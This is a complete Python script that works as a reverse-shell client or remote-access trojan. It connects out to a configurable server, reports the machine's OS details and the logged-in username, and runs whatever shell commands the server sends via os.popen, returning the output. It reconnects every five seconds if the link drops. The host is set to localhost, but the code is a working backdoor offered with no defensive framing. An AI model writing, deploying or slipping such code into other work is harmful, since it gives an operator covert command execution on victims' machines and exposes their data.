import socket
import os
import platform
import json
import time

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9999

def get_system_info():
    return {
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.architecture()[0],
        'username': os.getlogin()
    }

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_HOST, SERVER_PORT))

    system_info = get_system_info()
    client.send(f'info:{json.dumps(system_info)}'.encode())

    while True:
        command = client.recv(1024).decode()
        print("Command:",command)
        if command.startswith('cmd:'):
            try:
                result = os.popen(command.split('cmd:')[1]).read()
                print("Result: ",result)
                if not result:
                    result = 'Command executed successfully but no output was returned.'
                client.send(f'output:{json.dumps({"command": command, "output": result, "ip": SERVER_HOST})}'.encode())
                
            except Exception as e:
                client.send(f'output:{json.dumps({"command": command, "output": str(e), "ip": SERVER_HOST})}'.encode())
        time.sleep(1)

if __name__ == "__main__":
    while True:
        try:
            connect_to_server()
        except:
            time.sleep(5)
            continue
